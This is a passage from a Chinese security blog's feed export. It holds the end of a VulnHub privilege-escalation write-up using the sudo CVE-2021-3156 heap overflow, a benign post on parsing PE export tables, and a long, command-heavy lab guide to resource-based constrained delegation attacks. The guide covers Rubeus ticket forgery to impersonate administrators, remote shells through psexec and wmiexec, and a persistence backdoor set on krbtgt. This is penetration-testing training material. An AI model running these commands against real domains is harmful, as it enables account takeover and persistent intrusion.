<p>查看两个文本文件得知，提示登陆ftp出错，要访问流量（ftp是基于明文的协议类型）</p>
<p>进行流量分析，只有命令行不能使用wireshark，使用tcpdump</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230851167.png" class title="image-20220304230851167">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230859891.png" class title="image-20220304230859891">

<p>（接收到用户名密码）</p>
<p>使用账号密码登陆22端口的ssh服务，发现是宿主机</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230952447.png" class title="image-20220304230952447">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231001814.png" class title="image-20220304231001814">



<h1 id="进一步信息收集，利用堆溢出漏洞提权"><a href="#进一步信息收集，利用堆溢出漏洞提权" class="headerlink" title="进一步信息收集，利用堆溢出漏洞提权"></a>进一步信息收集，利用堆溢出漏洞提权</h1><p>没有执行sudo的权限</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231226255.png" class title="image-20220304231226255">



<p>检查内核没戏</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231252289.png" class title="image-20220304231252289">



<p>抱着永不放弃的精神检查一下还有什么可利用的</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231431058.png" class title="image-20220304231431058">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231440102.png" class title="image-20220304231440102">



<p>sudo版本低，还是Debian10，直接上谷歌</p>
<p><a href="https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231534664.png" class title="image-20220304231534664">

<p>果然，这个版本的sudo有堆溢出</p>
<p>poc验证sudoedit -s ‘&#39; <code>perl -e &#39;print &quot;A&quot; x 65536&#39;</code></p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231633754.png" class title="image-20220304231633754">

<p>（因输入的大小原因程序发生了错误）</p>
<p>msf当中有利用代码，show options缺啥补啥吧</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231712112.png" class title="image-20220304231712112">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231738788.png" class title="image-20220304231738788">



<p>尝试多次后始终不行，怀疑这里有大坑</p>
<p>查找手动利用代码，<a href="https://github.com/worawit/CVE-2021-3156%EF%BC%8C%E4%BF%AE%E6%94%B9%E4%B8%80%E7%82%B9%E4%BB%A3%E7%A0%81">https://github.com/worawit/CVE-2021-3156，修改一点代码</a></p>
<p>一番搜寻过后原来这台机器的sudo路径与众不同。。信息收集的重要性体现出来了</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231935353.png" class title="image-20220304231935353">



<p>打exp，nc来传输</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231958668.png" class title="image-20220304231958668">

<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304232010595.png" class title="image-20220304232010595">



<p>执行exp过后终于打点成功</p>
<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304232045850.png" class title="image-20220304232045850">



<p>总结：总的来说这台靶机挺有意思的，是很基础的溢出漏洞，但作为一台作者表明高难度的靶机确实有他的难处。缓冲区溢出这里是很原理性的操作，更高难度需要逆向分析的溢出这台还没体现出来，以后会慢慢更新。</p>
]]></content>
      <categories>
        <category>有难度的靶场</category>
      </categories>
      <tags>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>导出表结构解析</title>
    <url>/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="导出表结构解析"><a href="#导出表结构解析" class="headerlink" title="导出表结构解析"></a>导出表结构解析</h1><p>正常情况下，只有dll动态链接库才有导出表，这里用dll文件来做实验</p>
<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326140512674.png" class title="image-20220326140512674">



<p>导出表的基本结构，进入导出表</p>
<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326140711566.png" class title="image-20220326140711566">

<p>相关的参数如图中的注释</p>
<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326141430682.png" class title="image-20220326141430682">



<p>写函数解析导出表上半部分的结构</p>
<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326144108918.png" class title="image-20220326144108918">

<p>在LordPE中这就是红线框起来的部分</p>
<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326144155090.png" class title="image-20220326144155090">

<p>还需要把下面的函数名以及RVA等打印出来</p>
<p>后面三个属性需要是RVA需要转换</p>
<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326150854304.png" class title="image-20220326150854304">

<p>执行后成功返回我们需要的信息</p>
<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326151530348.png" class title="image-20220326151530348">



<p>重点理解一下最后三个RVA（AddressOfFunctions，AddressOfNames，AddressOfNameOrdinals）</p>
<p>AddressOfFunctions：一个RVA，指向一个DWORD数组，数组中的每一项是一个导出函数的RVA，顺序与导出序号相同。</p>
<p>AddressOfNames：一个RVA，依然指向一个DWORD数组，数组中的每一项仍然是一个RVA，指向一个表示函数名字。</p>
<p>AddressOfNameOrdinals：一个RVA，还是指向一个WORD数组，数组中的每一项与AddressOfNames中的每一项对应，表示该名字的函数在AddressOfFunctions中的序号。</p>
<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326153512424.png" class title="image-20220326153512424">



<p>参考：<a href="https://blog.csdn.net/evileagle/article/details/12176797">https://blog.csdn.net/evileagle/article/details/12176797</a></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>PE</tag>
      </tags>
  </entry>
  <entry>
    <title>基于资源的约束委派</title>
    <url>/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于资源的约束委派（RBCD）是在windows server 2012中加入的新功能，与普通的约束委派不同，它不需要域管理员去设置相关属性。但是请求ST的过程和约束委派过程大同小异，RBCD把设置委派的权限赋给了机器本身，机器可以决定谁可以被委派来控制自身。更理论一点就是传统的约束委派S4U2Self返回的票据（ST1）一定是可转发的，如果不可转发那么S4U2Proxy将失败；但是基于资源的约束委派不同，就算S4U2Self返回的票据不可转发（可不可以转发由TrustedToAuthenticationForDelegation决定），S4U2Proxy也是可以成功，并且S4U2Proxy返回的票据（ST2）总是可转发。</p>
<p>这里引用Elad的思维导图（<a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html%EF%BC%89">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html）</a></p>
<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318090529465.png" class title="image-20220318090529465">

<p>从图中可以看出，基于资源的约束委派与传统的约束委派非常相似，但工作方向相反。从帐户 A （例如上一篇文章的DC）到帐户 B 的传统约束委派在帐户 A 的 msDS-AllowedToDelegateTo 属性中配置，并定义从 A 到 B 的“传出”信任，而基于资源的约束委派在帐户 B 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性中配置，并定义了从 A 到 B 的“传入”信任。 </p>
<h1 id="基于资源的约束委派利用"><a href="#基于资源的约束委派利用" class="headerlink" title="基于资源的约束委派利用"></a>基于资源的约束委派利用</h1><h2 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h2><ul>
<li>域：whoamianony.org</li>
<li>域控： 192.168.93.30，主机名DC，Windows Server 2012R2</li>
<li>域成员： 192.168.93.40，主机名PC2，Windows 7 专业版</li>
<li>用户bunny对PC2有写权限</li>
</ul>
<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318145144632.png" class title="image-20220318145144632">

<h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><p>验证bunny这个用户是否对PC2有写权限，用pwerview枚举，PC2.whoamianony.org中的特定ACE（<strong>运行脚本一直有报错，但是不影响结果</strong>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line">Get-DomainUser -Identity bunny -Properties objectsid</span><br><span class="line">Get-DomainObjectAcl -Identity PC2  | ?&#123;$_.SecurityIdentifier -match &quot;S-1-5-21-1315137663-3706837544-1429009142-1112&quot;&#125;</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151625486.png" class title="image-20220318151625486">

<p>bunny对主机PC2有写入权限，其实不一定要GenericWrite，WriteProperty，WriteDacl都可以，当然最好的是GenericAll（完全控制权）</p>
<p>现在需要一个具有SPN的账号，因为s4u2self只适用于具有SPN的账户，我们的目的是在之后通过s4u2proxy协议代替用户发起请求，而s4u2proxy是根据kerberos发起请求的，SPN是一种服务主体名称，域环境中的每台服务器都需要在Kerberos身份验证服务中注册SPN。恰好域中有一个属性MachineAccountQuota，这个值表示允许用户在域中创建的计算机账户数，默认为10。我们创建的账户默认注册在<code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN之下。因此我们可以利用。</p>
<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318100656209.png" class title="image-20220318100656209">



<p>使用powermad中的New-MachineAccount注册一个计算机用户win7，密码为win7</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount win7 -Domain whoamianony.org -DomainController DC.whoamianony.org -Verbose</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151835228.png" class title="image-20220318151835228">



<p>查看是否添加成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151858125.png" class title="image-20220318151858125">



<p>查看spn票据，能添加成功机器账号肯定是有spn的，但还是可以查看一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn —q */* | findstr &quot;win7&quot;</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151956537.png" class title="image-20220318151956537">



<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318131103230.png" class title="image-20220318131103230">

<p>这是新添加的win7的机器用户  </p>
<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318131156113.png" class title="image-20220318131156113">

<p>这是要修改的属性，根据微软官方文档的解释，此属性用于访问检查以确定请求者是否有权代表其他身份对以此帐户运行的服务进行操作。<strong>注：这里截图截错了应该是看PC2的msDS-AllowedToActOnBehalfOfOtherIdentity的值为未设置</strong></p>
<p>修改PC2的msDS-AllowedToActOnBehalfOfOtherIdentity属性的值，有两种方法</p>
<p><strong>一、powerview脚本</strong></p>
<p>首先使用pwerview脚本查看机器账户win7的sid</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-NetComputer -Identity win7</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318152113521.png" class title="image-20220318152113521">



<p>然后配置win7到PC2的基于资源约束的委派（<strong>运行脚本一直有报错，但是不影响结果</strong>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1315137663-3706837544-1429009142-2103)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer PC2| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318152253325.png" class title="image-20220318152253325">



<p>验证是否成功添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-DomainComputer PC2 -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure>

<p>不为空就修改成功</p>
<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318152406051.png" class title="image-20220318152406051">

<p>在域控上查看msds-allowedtoactonbehalfofotheridentity的值可以看到是字节数组，所以不能直接用字符串型</p>
<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318132830587.png" class title="image-20220318132830587">



<p>若想清除msds-allowedtoactonbehalfofotheridentity属性的值，可用如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-DomainObject PC2 -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure>

<p><strong>二、通过ActiveDirectory模块添加</strong></p>
<p>只有Windows Server 2012以及以上的ActiveDirectory模块才有-PrincipalsAllowedToDelegateToAccount选项，域内普通主机是不存在ActiveDirectory模块的，但是可以将DLL文件复制出来，然后导入即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import-module Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Set-ADComputer PC2 -PrincipalsAllowedToDelegateToAccount win7$</span><br><span class="line">Get-ADComputer PC2 -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318133951958.png" class title="image-20220318133951958">

<p>这里已经添加过了，就不再演示了</p>
<h2 id="进行攻击"><a href="#进行攻击" class="headerlink" title="进行攻击"></a>进行攻击</h2><h3 id="典型的基于资源约束委派攻击"><a href="#典型的基于资源约束委派攻击" class="headerlink" title="典型的基于资源约束委派攻击"></a>典型的基于资源约束委派攻击</h3><p>现在没有票据是肯定无法访问PC2的</p>
<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318155719648.png" class title="image-20220318155719648">



<p>rubeus是不支持明文密码的，先将创建的机器用户的密码转换成hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash /user:win7 /password:win7 /domain:whoamianony.org</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318153253944.png" class title="image-20220318153253944">



<p>然后用win7的rc4  hash值请求一个可转发的票据（相当于白银票据），并且导入到内存中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54 /impersonateuser:administrator /msdsspn:cifs/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161255297.png" class title="image-20220318161255297">

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161307765.png" class title="image-20220318161307765">



<p>cifs是文件共享，还需要导入host服务的票据才能psexec</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54  /impersonateuser:administrator /msdsspn:host/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161343840.png" class title="image-20220318161343840">

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161423491.png" class title="image-20220318161423491">

<p>接下来可以正常用psexec获得一个shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec64.exe \\PC2 -s cmd</span><br><span class="line">Python3 getSt.py -dc-ip 192.168.93.40 -spn cifs/oa -impersonate Administrator whoamianony.org/whoamianony:win7:win7</span><br></pre></td></tr></table></figure>

<p>使用impacket工具包只要获得一个cifs凭据即可获得PC2的shell</p>
<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161609684.png" class title="image-20220318161609684">

<h3 id="解决敏感用户不可委派问题"><a href="#解决敏感用户不可委派问题" class="headerlink" title="解决敏感用户不可委派问题"></a>解决敏感用户不可委派问题</h3><p>利用条件：知道目标的主机账户的凭证</p>
<p>在域环境中，高权限用户如果没有特殊需求的情况下，考虑到安全性一般是设置为不可委派，或者是加入受保护组</p>
<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318144136403.png" class title="image-20220318144136403">



<p>清除票据</p>
<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318162000613.png" class title="image-20220318162000613">

<p>此时再去申请票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54 /impersonateuser:administrator /msdsspn:cifs/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318162252245.png" class title="image-20220318162252245">

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318162307877.png" class title="image-20220318162307877">

<p>当账户不可委派以及受保护组的成员可以完成S4U2Self，不能完成S4U2proxy，可以使用<code>Rubeus describe</code>查看一下S4U2self返回的票据信息，可以看到该票据是没有服务名称的，并且不可转发。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rubeus.exe describe /ticket:申请的票据的base64值</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318174454339.png" class title="image-20220318174454339">

<p>这里可以看到申请的servicename本来应该为cifs&#x2F;PC2（host&#x2F;PC2），但是这里只有win7，这是因为服务名称丢失了，只需要补上就可以了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:ldap [/ptt] [/luid]</span><br><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:cifs/computer.domain.com [/ptt] [/luid]</span><br></pre></td></tr></table></figure>

<p>如下（这里我一直使用的是加密后的base64，因为使用kirbi会报莫名其妙的错误）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub /ticket:请求cifs票据的base64值 /altservice:cifs/PC2.whoamianony.org /ptt</span><br><span class="line">Rubeus.exe tgssub /ticket:请求host票据的base64值 /altservice:host/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>

<p>未申请之前</p>
<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318175059468.png" class title="image-20220318175059468">



<p>申请之后</p>
<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318175404412.png" class title="image-20220318175404412">

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318175630923.png" class title="image-20220318175630923">

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318180737281.png" class title="image-20220318180737281">

<p>这里申请host的票据也是一样的步骤，就不再赘述了</p>
<h3 id="利用基于资源的约束委派进行域权限维持"><a href="#利用基于资源的约束委派进行域权限维持" class="headerlink" title="利用基于资源的约束委派进行域权限维持"></a>利用基于资源的约束委派进行域权限维持</h3><p>主要思想是：在获得域控的管理员权限后，修改krbtgt或是域控的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性，加入已知后门账户的SID。</p>
<p>根据这样基于资源的约束委派攻击生成白银票据的方式进行权限维持</p>
<p>1、配置注册的主机账号（比如我这里的主机账号是win7）到krbtgt基于资源的约束委派</p>
<p>2、配置注册的主机账号（比如我这里的主机账号是win7）到域控基于资源的约束委派</p>
<p>这是windows 版本在2012之下（我的域控是2012的，所以这里选择第二种方法）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1315137663-3706837544-1429009142-2103)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Set-DomainObject krbtgt -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>



<p>在windows版本在2012及以上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount win7$</span><br><span class="line">Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318202451168.png" class title="image-20220318202451168">

<p>注意这是做权限维持，这是在域控上操作的</p>
<p>修改Krbtgt用户的PrincipalsAllowedToDelegateToAccount属性后，我们已经做好了后门了，然后就可以请求TGT</p>
<p>请求成功！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54  /impersonateuser:administrator /msdsspn:krbtgt /ptt</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318203355644.png" class title="image-20220318203355644">

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318203411815.png" class title="image-20220318203411815">

<p>然后利用s4u2proxy返回的TGT去申请一张访问域控cifs服务的ST2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgs /user:win7$ /enctype:rc4 /service:cifs/DC /domain:whoamianony.org /ticket:请求的ST2的base64 /ptt</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318204344841.png" class title="image-20220318204344841">

<p>我不知道为什么这里报了一个小错误，但确实可以请求一个ST访问域控了。请求host服务一样的方法</p>
<p>这样请求票据只能一个一个请求，用impacket工具包会方便很多</p>
<p>这里先删除票据</p>
<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318204546537.png" class title="image-20220318204546537">



<p>使用impacket工具，这里我不知道为什么一直无法将票据进行设置，原理是没错的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getst_windows.exe -dc-ip 192.168.93.30 -spn krbtgt -impersonate Administrator whoamianony.org/win7$:win7</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set KRB5CCNAME=Administrator.ccache</span><br><span class="line">wmiexec.exe -no-pass -k DC</span><br></pre></td></tr></table></figure>



<h3 id="在域外进行基于资源的约束委派攻击"><a href="#在域外进行基于资源的约束委派攻击" class="headerlink" title="在域外进行基于资源的约束委派攻击"></a>在域外进行基于资源的约束委派攻击</h3><p>SharpAllowedToAct可以自动生成机器账户</p>
